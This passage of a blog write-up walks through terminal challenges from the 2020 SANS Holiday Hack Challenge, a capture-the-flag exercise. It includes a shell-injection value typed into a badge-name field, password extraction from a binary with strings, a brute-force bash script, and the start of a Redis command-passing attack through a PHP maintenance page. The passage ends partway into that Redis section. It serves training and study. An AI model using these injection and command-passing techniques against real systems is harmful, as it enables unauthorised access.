<li>
<a href=#11a---naughtynice-list-with-blockchain-investigation-part-1 aria-label="11a - naughty/nice list with blockchain investigation part 1">11a - naughty/nice list with blockchain investigation part 1</a></li>
<li>
<a href=#11b---naughtynice-list-with-blockchain-investigation-part-2 aria-label="11b - naughty/nice list with blockchain investigation part 2">11b - naughty/nice list with blockchain investigation part 2</a>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><figure>
<img loading=lazy src=/images/holidayhack-20/hhclogo.png>
</figure>
<h1 id=foreword>foreword<a hidden class=anchor aria-hidden=true href=#foreword>#</a></h1>
<p>After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I&rsquo;m met with a &ldquo;Congratulations&rdquo; message as I had just completed the final objective for the <a href=https://holidayhackchallenge.com/2020/>2020 SANS Holiday Hack Challenge</a>!</p>
<p>For a few days during my holiday break I set out to play the challenge this year. I&rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?). Anyways, this post is basically <strong>one big spoiler</strong>, but details on the challenges and how I solved &lsquo;em follows.</p>
<p>To help navigate this monster, I suggest you check out the table of contents on the side.</p>
<h2 id=intro>intro<a hidden class=anchor aria-hidden=true href=#intro>#</a></h2>
<p>Knowing the format of Holiday Hack and how to actually get to challenges is something I struggled with in the past. Having a character that bounces around a map is confusing, and unexpected at first. But, once you figure out which bits are important (your location, your badge and the challenges themselves), you should be good to go. <a href=https://www.coengoedegebure.com/getting-started-with-sans-holiday-hack-challenge-2020/>This</a> post is a good &ldquo;getting started&rdquo; guide to demystify some of that stuff for the 2020 challenges.</p>
<p>Embrace the format, it&rsquo;s part of the fun.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/hackerfam.png> <figcaption>
me and some hacker fam in the talks lobby!
</figcaption>
</figure>
<p>I won’t repeat all of the logistics, instead, I want to dive straight into the challenges themselves. Basically, there were two &ldquo;types&rdquo; of challenges. The main objectives and the &ldquo;terminal&rdquo; challenges. Terminal challenges were typically easier (but definitely fun and challenging too!), and once completed the Elf next to the terminal would provide some hints and other info for objectives.</p>
<h2 id=format>format<a hidden class=anchor aria-hidden=true href=#format>#</a></h2>
<p>I never really found myself in a position where I did not have an idea of what I had to do. Very clear directions on the challenges were given in the form of hints from Elves, solving terminal challenges or by viewing the <em>Hints</em> section in your badge.</p>
<h2 id=terminals>terminals<a hidden class=anchor aria-hidden=true href=#terminals>#</a></h2>
<p>Once completed, terminal challenges would reveal vital hints for the main objectives, so clearing them was really useful and fun!</p>
<h3 id=unescape-tmux>unescape tmux<a hidden class=anchor aria-hidden=true href=#unescape-tmux>#</a></h3>
<p><em>Pepper Minstix</em> stands next to a terminal called &ldquo;Unescape Tmux&rdquo; in the entry area. Something about watching a bird, I don&rsquo;t know.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_unescape_tmux_pepper_minstix.png> <figcaption>
pepper minstix being... weird.
</figcaption>
</figure>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_unescape_tmux_shell.png> <figcaption>
unescape tmux initial shell
</figcaption>
</figure>
<p>Solving this challenge is really, really easy. You can check out existing <code>tmux</code> sessions with <code>tmux ls</code>. If there is only one, running <code>tmux attach</code> will reattach to it.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_unescape_tmux_solved.png> <figcaption>
right...
</figcaption>
</figure>
<p>Anyways, solving this one gives us some information about the Santavator and how to operate it.</p>
<blockquote>
<p>You found her! Thanks so much for getting her back!<br>
Hey, maybe I can help YOU out!<br>
There&rsquo;s a Santavator that moves visitors from floor to floor, but it&rsquo;s a bit wonky.<br>
You&rsquo;ll need a key and other odd objects. Try talking to Sparkle Redberry about the key.<br>
For the odd objects, maybe just wander around the castle and see what you find on the floor.<br>
Once you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4).<br>
You need to power the red, yellow, and green receivers with the right color light!</p>
</blockquote>
<h3 id=kringle-kiosk>kringle kiosk<a hidden class=anchor aria-hidden=true href=#kringle-kiosk>#</a></h3>
<p><em>Shinny Upatree</em> stands next to a terminal called &ldquo;Kringle Kiosk&rdquo; in the entry area. Apparently this terminal has a map, some form of badge printer and more!</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/investigate_s3_bucket.png> <figcaption>
shinny upatree looking dashing
</figcaption>
</figure>
<p>Starting the challenge we get.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_kringle_kiosk_shell.png> <figcaption>
kringle kiosk initial shell
</figcaption>
</figure>
<p>From the initial output we&rsquo;re asked if we can get a bash shell.</p>
<p>Hitting <code>enter</code> after that message we&rsquo;re presented with a menu with a few options. Playing with option <code>4</code> to <em>Print Name Badge</em>, if you entered <code>;/bin/bash</code> as your name you will solve the challenge and get the shell.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_kringle_kiosk_solved.png> <figcaption>
kringle kiosk bash shell
</figcaption>
</figure>
<p>I was curious about where the cowsay came from, which looks like it was as a result of the <code>~/.bashrc</code> file (there has to be more here&mldr;):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># file: ~/.bashrc</span>
export PAGER<span style=color:#f92672>=</span>less
export PATH<span style=color:#f92672>=</span>/usr/games:$PATH
/home/elf/runtoanswer WelcomeToSantasCastle
cat /opt/success.txt
sleep <span style=color:#ae81ff>2</span>
</code></pre></div><h3 id=linux-primer>linux primer<a hidden class=anchor aria-hidden=true href=#linux-primer>#</a></h3>
<p><em>Sugarplum Mary</em> stands next to a terminal called &ldquo;Linux Primer&rdquo; in the courtyard. Apparently this terminal has some Linux basic&rsquo;s material we have to go through.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/santa_shop.png> <figcaption>
linux primer in courtyard
</figcaption>
</figure>
<p>There isn&rsquo;t much to say about this challenge. It&rsquo;s very basic Linux stuff that you need to do based on the question that you get on the top pane. An example of what that looks like is below.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_linux_primer.png> <figcaption>
linux primer challenge flow
</figcaption>
</figure>
<p>Solving this challenge gave hints for the Point-of-Sale objective.</p>
<h3 id=speaker-unprep>speaker unprep<a hidden class=anchor aria-hidden=true href=#speaker-unprep>#</a></h3>
<p><em>Bushy Evergreen</em> stands next to a terminal called &ldquo;Speaker UNPrep&rdquo; in the courtyard. Looks like Bushy needed help opening the Speaker Unpreparedness room.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/speaker_unprep.png> <figcaption>
speaker unpreparedness in the talks lobby
</figcaption>
</figure>
<p>Opening the terminal challenge for the first time shows the following:</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_speaker_unprep_shell.png> <figcaption>
speaker unpreparedness terminal welcome message
</figcaption>
</figure>
<p>This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each challenge lived in the <code>lab/</code> directory, making it possible to fiddle with them and not break the &ldquo;real&rdquo; ones.</p>
<h4 id=door>door<a hidden class=anchor aria-hidden=true href=#door>#</a></h4>
<p>The most important of the challenges, but also the easiest one, we start by just running the <code>door</code> program and see how it behaves.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@aaa8cc7e08d2 ~ $ ./door 
You look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There&#39;s gotta be a
tool for this...
What do you enter? &gt; poo
Checking......
Beep boop invalid password
</code></pre></div><p>Ok, <code>poo</code> is not the password. If we run <code>strings</code> over the binary we could maybe narrow it down. A good string to search for would be <em>&ldquo;What do you enter?"</em>. I usually <code>grep</code> for these types of things to narrow a match down with a little bit of context using the <code>-A</code> and <code>-B</code> flags to print me some data before and after a match. The output from <code>strings</code> over a binary can be noisy, so this is a bit of a habit I guess.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@aaa8cc7e08d2 ~ $ strings door | grep -i &#34;what do you enter&#34; -A 10 -B 10
6666666666666666\\\\\\\\\\\\\\\\
vRQ&gt;
8STs
LwH&#39;
             at 0123456789abcdef
) when slicing `
connection resetentity not foundalready borrowed$
/home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There&#39;s gotta be a
tool for this...
What do you enter? &gt; 
opendoor
 (bytes Overflowextern &#34;
NulErrorBox&lt;Any&gt;thread &#39;expected, found Door opened!
That would have opened the door!
Be sure to finish the challenge in prod: And don&#39;t forget, the password is &#34;Op3nTheD00r&#34;
Beep boop invalid password
src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/
usr/src/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace:
 -       
cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/backtrace/src/lib.rsS
omething went wrong: Checking...Something went wrong reading input: Something went wrong in 
the environment: couldn&#39;t get the executable name
Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help!
</code></pre></div><p>Notice the section that reads <code>And don't forget, the password is "Op3nTheD00r"</code> ? There&rsquo;s the password too! If you just grepped for <code>password</code> you would have also found this.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@aaa8cc7e08d2 ~ $ ./door 
You look at the screen. It wants a password. You roll your eyes - the 
password is probably stored right in the binary. There&#39;s gotta be a
tool for this...
What do you enter? &gt; Op3nTheD00r
Checking......
Door opened!
</code></pre></div><h4 id=lights>lights<a hidden class=anchor aria-hidden=true href=#lights>#</a></h4>
<p>Running the <code>lights</code> program the output makes quite a big fuss about the <code>lights.conf</code> configuration file.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@51340abdb0bc ~/lab $ ./lights 
The speaker unpreparedness room sure is dark, you&#39;re thinking (assuming
you&#39;ve opened the door; otherwise, you wonder how dark it actually is)
You wonder how to turn the lights on? If only you had some kind of hin---
 &gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf
---t to help figure out the password... I guess you&#39;ll just have to make do!
The terminal just blinks: Welcome back, elf-technician
What do you enter? &gt; 
</code></pre></div><p>Investigating the configuration files&rsquo; contents shows what looks like an &ldquo;encrypted&rdquo; version of the password is stored.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@51340abdb0bc ~/lab $ cat lights.conf 
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
name: elf-technician
</code></pre></div><p>I fiddled with the values for a bit, and eventually set the <code>password</code> value for <code>name</code> and ran <code>lights</code> again after reading the hint we had on our badge.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@5641592049a0 ~/lab $ cat lights.conf 
password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>elf@5641592049a0 ~/lab $ ./lights 
The speaker unpreparedness room sure is dark, you&#39;re thinking (assuming
you&#39;ve opened the door; otherwise, you wonder how dark it actually is)
You wonder how to turn the lights on? If only you had some kind of hin---
 &gt;&gt;&gt; CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf
---t to help figure out the password... I guess you&#39;ll just have to make do!
The terminal just blinks: Welcome back, Computer-TurnLightsOn
What do you enter? &gt; Computer-TurnLightsOn
Checking......
That would have turned on the lights!
If you&#39;ve figured out the real password, be sure you run /home/elf/lights
</code></pre></div><p>Noticed the <code>Computer-TurnLightsOn</code> there? That’s the password ;) Looks like the program jumps into an opportunistic decryption routine if a value starts with <code>E$</code>. lol.</p>
<p>With that done, running the real <code>light</code> program should turn the lights on in the Speaker Unpreparedness room.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>
[ ... ]

What do you enter? &gt; Computer-TurnLightsOn
Checking......

Lights on!
</code></pre></div><h4 id=vending-machine>vending-machine<a hidden class=anchor aria-hidden=true href=#vending-machine>#</a></h4>
<p>This was actually the very last challenge I solved, and honestly, I don&rsquo;t like my solution. From all of the hints available both on your badge and from Bushy Evergreen I gathered that it was a classic Vigenère cipher that needed cracking, but alas, I couldn&rsquo;t solve it that way.</p>
<p>Running the <code>./vending-machine</code> binary, you were asked to enter a code to turn the vending machine back on. Inspecting the <code>vending-machines.json</code> configuration file next to the binary we see:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
  <span style=color:#f92672>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;elf-maintenance&#34;</span>,
  <span style=color:#f92672>&#34;password&#34;</span>: <span style=color:#e6db74>&#34;LVEdQPpBwr&#34;</span>
}
</code></pre></div><p>In the <code>lab/</code> folder, if we delete the <code>vending-machine.json</code> file and re-run the <code>vending-machine</code> binary, we&rsquo;re asked to enter new fields for a new configuration file. This is what I figured was the Chosen plaintext primitive for the Vigenère crack, but alas, that failed for me.</p>
<p>After many, many attempts at solving this I asked for some help and was told some people were just brute forcing the password. So, again in the <code>lab/</code> folder I tested the output you&rsquo;d get in the <code>vending-machine.json</code> when choosing single character passwords, and eventually came to see if we used something that started with a <code>C</code>, we&rsquo;d get an output string of <code>L</code> line in the <code>password</code> field in the <code>.json</code> file.</p>
<p>In the end, I scripted the brute force. Not my proudest moment, but I really tried!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e>#!/bin/bash
</span><span style=color:#75715e></span>
PASS<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>             <span style=color:#75715e># this eventually fills to CandyCane1</span>
MATCH<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;LVEdQPpBwr&#34;</span>

test_pass<span style=color:#f92672>()</span> <span style=color:#f92672>{</span>
    local C<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>PASS<span style=color:#e6db74>}</span>$1<span style=color:#e6db74>&#34;</span>

    rm -f vending-machines.json
    printf <span style=color:#e6db74>&#34;a\n</span><span style=color:#e6db74>${</span>C<span style=color:#e6db74>}</span><span style=color:#e6db74>\n&#34;</span> | ./vending-machines &gt;/dev/null

    R<span style=color:#f92672>=</span><span style=color:#66d9ef>$(</span>grep password vending-machines.json | cut -d <span style=color:#e6db74>&#39;&#34;&#39;</span> -f 4<span style=color:#66d9ef>)</span>
    echo <span style=color:#e6db74>&#34;[i] got </span><span style=color:#e6db74>${</span>R<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
    grep -E <span style=color:#e6db74>&#34;^</span><span style=color:#e6db74>${</span>R<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>&lt;&lt;&lt;</span> $MATCH

    RETVAL<span style=color:#f92672>=</span>$?

    <span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> <span style=color:#e6db74>${</span>RETVAL<span style=color:#e6db74>}</span> -ne <span style=color:#ae81ff>0</span> <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
        <span style=color:#66d9ef>return</span> 
    <span style=color:#66d9ef>fi</span>

    PASS<span style=color:#f92672>=</span><span style=color:#e6db74>${</span>C<span style=color:#e6db74>}</span>
<span style=color:#f92672>}</span>

<span style=color:#66d9ef>while</span> true
<span style=color:#66d9ef>do</span>

    <span style=color:#66d9ef>for</span> L in <span style=color:#f92672>{{</span>0..9<span style=color:#f92672>}</span>,<span style=color:#f92672>{</span>A..Z<span style=color:#f92672>}</span>,<span style=color:#f92672>{</span>a..z<span style=color:#f92672>}}</span>; <span style=color:#66d9ef>do</span>
        echo <span style=color:#e6db74>&#34;[i] trying </span><span style=color:#e6db74>${</span>L<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
        test_pass $L

        echo <span style=color:#e6db74>&#34;[i] pass thus far: </span><span style=color:#e6db74>${</span>PASS<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
    <span style=color:#66d9ef>done</span>
<span style=color:#66d9ef>done</span>
</code></pre></div><p>In the end, the password was <code>CandyCane1</code>.</p>
<h3 id=the-elf-code>the elf code<a hidden class=anchor aria-hidden=true href=#the-elf-code>#</a></h3>
<p><em>Ribb Bonbowford</em> stands next to a terminal called &ldquo;The Elf C0de&rdquo; in the dining room. Pretty evil looking Elf if you ask me! Looks like this challenge is a programming game, specifically targeting JavaScript.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_the_elf_code_ribb_bonbowford.png> <figcaption>
the elf c0de terminal in the dining room
</figcaption>
</figure>
<p>Here you are presented with a 2D game where you need to control your character using a small JavaScript program. Each level is different and presents you with a gradually more difficult problem to solve.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_the_elf_code_level1.png> <figcaption>
the elf c0de terminal in the dining room
</figcaption>
</figure>
<p>The above screenshot is level 1, and could be solved with the following two lines:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>10</span>);
</code></pre></div><p>Some levels had nested challenges that you had to solve using code as well. These were to do things like open trap doors, remove &ldquo;yeeters&rdquo; etc. You had to click the challenge object to know what you had to do in code to solve it too, submitting an answer with something like <code>elf.pull_lever(&lt;answer>)</code>.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_the_elf_code_level2_lever.png> <figcaption>
level 2 lever objective description
</figcaption>
</figure>
<p>So, to solve level 2, you had to add <code>2</code> to whatever value you got when you called <code>get_lever(0)</code>. The rest of my solutions follow.</p>
<p>Level 2</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lever</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>pull_lever</span>(<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>get_lever</span>(<span style=color:#ae81ff>0</span>) <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveLeft</span>(<span style=color:#ae81ff>4</span>);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>10</span>);
</code></pre></div><p>Level 3</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#ae81ff>1</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#ae81ff>2</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>1</span>);
</code></pre></div><p>Level 4</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>40</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
  <span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveLeft</span>(<span style=color:#ae81ff>1</span>);
  <span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>12</span>);
  <span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveLeft</span>(<span style=color:#ae81ff>1</span>);
  <span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveDown</span>(<span style=color:#ae81ff>12</span>);
}
</code></pre></div><p>Level 5</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>munchkin</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>tell_munch</span>(<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>ask_munch</span>(<span style=color:#ae81ff>0</span>).<span style=color:#a6e22e>filter</span>(<span style=color:#a6e22e>e</span> =&gt; <span style=color:#66d9ef>typeof</span>(<span style=color:#a6e22e>e</span>) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;number&#39;</span>));
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>2</span>);
</code></pre></div><p>Level 6</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>4</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
  <span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lollipop</span>[<span style=color:#a6e22e>i</span>]);
}
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>lever</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>pull_lever</span>([<span style=color:#e6db74>&#34;munchkins rule&#34;</span>, ...<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>get_lever</span>(<span style=color:#ae81ff>0</span>)]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveTo</span>(<span style=color:#a6e22e>munchkin</span>[<span style=color:#ae81ff>0</span>]);
<span style=color:#a6e22e>elf</span>.<span style=color:#a6e22e>moveUp</span>(<span style=color:#ae81ff>2</span>);
</code></pre></div><p>After level 6 the challenge is considered complete. There are more levels that were optional to do. I marked those to come back to later. After completion Ribb Bonbowford would tell us that the Santavator could probably be pwnd with some JavaScript.</p>
<h3 id=336-kbps>33.6 kbps<a hidden class=anchor aria-hidden=true href=#336-kbps>#</a></h3>
<p><em>Fitzy Shortstack</em> stands next to a phone labelled &ldquo;33.6kbps&rdquo; in the kitchen. Talking to Fitzy reveals that the lights on the Christmas trees are controlled using this dialup modem connection, but the modem seems broken. We&rsquo;re given a number, 756-8347 to dial.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_33.6_fitzy_shortstack.png> <figcaption>
33.6kbps telephone in the kitchen.
</figcaption>
</figure>
<p>Opening the phone by clicking on it we see this.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_33.6kbps_phone.png> <figcaption>
phone ui
</figcaption>
</figure>
<p>Picking up the phone and dialling the number you&rsquo;d hear a warped version of initial beep from the ever popular dialup sequence you would hear way, waaaay back (yeah, I remember those!). One of the hints Fitzy linked to was a recording of that exact sound here: <a href=https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg>https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg</a></p>
<p>The words on the note next to the phone corresponded to different sections of the dialup sequence, but they were morphed making them hard to identify quickly. I opened the reference <code>.ogg</code> file in Audacity and started piecing together the bits needed.</p>
<p>After dialling, the final sequence of words you had to click on the note were:</p>
<ul>
<li>baaDEEbrr</li>
<li>aaah</li>
<li>wewewwrwrrwrr</li>
<li>beDURRdunditty (followed quickly by)</li>
<li>SCHHRRHHRTHRTR</li>
</ul>
<p>Completing this challenge has Fitzy telling us that santa <em>really</em> trusts Shinny Upatree which is a hint as to who&rsquo;s HID card to clone to open the workshop.</p>
<h3 id=redis-bug-hunt>redis bug hunt<a hidden class=anchor aria-hidden=true href=#redis-bug-hunt>#</a></h3>
<p><em>Holly Evergreen</em> stands next to a terminal called &ldquo;Redis Bug Hunt&rdquo; in the kitchen. Sounds like there is some bug they have not confirmed and we have to find it! This was definitely one of the more fun terminal challenges for me!</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_redis_bug_hunt_holly_evergreen.png> <figcaption>
redis bug hunt terminal in the kitchen
</figcaption>
</figure>
<p>Opening the terminal presents us with a starting point.</p>
<figure>
<img loading=lazy src=/images/holidayhack-20/terminal_redis_bug_hunt_initial_shell.png> <figcaption>
redis bug hunt terminal initial shell
</figcaption>
</figure>
<p>Let&rsquo;s check out that <code>index.php</code> page quickly.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@f9292a141ef5:/var/www$ curl http://localhost/index.php
Something is wrong with this page! Please use http://localhost/maintenance.php to see if you
 can figure out what&#39;s going on
player@f9292a141ef5:/var/www$ 
</code></pre></div><p>Yep, that looks broken! Next, what about that suggested <code>curl</code> command to <code>maintenance.php</code>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@3cc815ce5966:~$ curl http://localhost/maintenance.php


ERROR: &#39;cmd&#39; argument required (use commas to separate commands); eg:
curl http://localhost/maintenance.php?cmd=help
curl http://localhost/maintenance.php?cmd=mget,example1
player@3cc815ce5966:~$ 
</code></pre></div><p>Looks like we need to specify a <code>cmd</code> argument. Based on the second example having <code>mget</code>, I realised these <code>cmd</code>&rsquo;s may be raw Redis <a href=https://redis.io/topics/rediscli>CLI commands</a>. Great! I&rsquo;ve definitely exploited RCE via redis before, and one of the <a href=https://book.hacktricks.xyz/pentesting/6379-pentesting-redis>hints</a> on your badge confirmed that too! Let&rsquo;s get to work.</p>
<p>First, just to confirm <code>cmd</code> really is passed to the redis CLI:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@f9292a141ef5:~$ curl http://localhost/maintenance.php?cmd=help
Running: redis-cli --raw -a &#39;&lt;password censored&gt;&#39; &#39;help&#39;

redis-cli 5.0.3
To get help about Redis commands type:
      &#34;help @&lt;group&gt;&#34; to get a list of commands in &lt;group&gt;
      &#34;help &lt;command&gt;&#34; for help on &lt;command&gt;
      &#34;help &lt;tab&gt;&#34; to get a list of possible help topics
      &#34;quit&#34; to exit

To set redis-cli preferences:
      &#34;:set hints&#34; enable online hints
      &#34;:set nohints&#34; disable online hints
Set your preferences in ~/.redisclirc
</code></pre></div><p>Excellent. Next question, where is this redis server? Maybe it’s on another host? I checked to see if our current box has a <code>redis-server</code> running:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@f9292a141ef5:~$ ps -ef | grep redis
root         6     1  0 10:54 pts/0    00:00:00 /usr/bin/redis-server 127.0.0.1:6379
player      61    48  0 10:57 pts/0    00:00:00 grep redis
</code></pre></div><p>Alright, so the redis-server is local. Running as root too! It won’t necessarily mean we&rsquo;ll become root exploiting the RCE as the primitive is usually that we can write anything, anywhere. Let&rsquo;s investigate the web directory for the local web server.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>player@f9292a141ef5:~$ cd /var/www/html/
-bash: cd: /var/www/html/: Permission denied
player@f9292a141ef5:~$ cd /var/www/
player@f9292a141ef5:/var/www$ ls -la
total 20
drwxr-xr-x 1 root     root     4096 Nov 24 18:52 .
drwxr-xr-x 1 root     root     4096 Nov 24 18:52 ..
